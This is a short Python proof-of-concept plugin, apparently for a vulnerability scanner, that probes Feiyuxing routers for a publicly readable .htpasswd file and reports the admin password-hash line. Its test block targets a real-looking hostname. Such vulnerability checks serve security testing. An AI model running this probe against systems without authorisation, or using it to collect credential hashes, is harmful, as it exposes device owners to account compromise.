#!/usr/bin/env python
#-*- coding:utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2010-070579

import urlparse


def assign(service, arg):
    if service == 'feiyuxing_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc1 = arg + '.htpasswd'
    code, head, res, errcode, _ = curl.curl(poc1)
    if code==200 and 'admin:$' in res:
        security_hole("Router vulnerable!:"+poc1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('feiyuxing_router', 'http://pos.disshanghai.com/')[1])